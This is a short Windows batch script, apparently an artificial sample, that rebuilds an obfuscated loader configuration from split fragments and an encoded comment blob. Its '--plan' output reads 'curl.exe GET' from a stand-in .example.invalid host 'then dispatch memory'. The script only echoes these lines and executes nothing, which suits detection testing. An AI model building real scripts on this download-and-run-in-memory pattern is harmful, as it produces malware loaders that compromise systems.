@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:plain_fragments|add_7
rem HUNTRESS-MATERIAL:fUQ4g3p7bHd6RGhqeHxweWxmeWx0dntsM2twendoe2pvZnRsdHZ5gINoa2h3e2x5RGp8eXM1bH9sg3p7aG5sZmp2fHV7RDiDbnlod29EbWhzc2loanJmeWx7eYCDdWx/e2ZzaHVufGhubER1dnVsg2podHdocG51ZnBrRGpodHdocG51ND1paEBtODpsQG2DfHlzRG97e3d6QTY2PWloQG04OmxAbTVsf2h0d3NsNXB1fWhzcGs2Nzs7Pz1qaUA1a2h7
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "fragment0=v=1|steps=acquire_remote,dispatch_memory|adapter="
set "fragment1=curl.exe|stage_count=1|graph=fallback_retry|next_"
set "fragment2=language=none|campaign_id=campaign-6ba9f13e9f|url"
set "fragment3==https://6ba9f13e9f.example.invalid/04486cb9.dat"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY call set "recovered_configuration=%%fragment0%%%%fragment1%%%%fragment2%%%%fragment3%%"
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo curl.exe GET https://6ba9f13e9f.example.invalid/04486cb9.dat then dispatch memory
exit /b 0
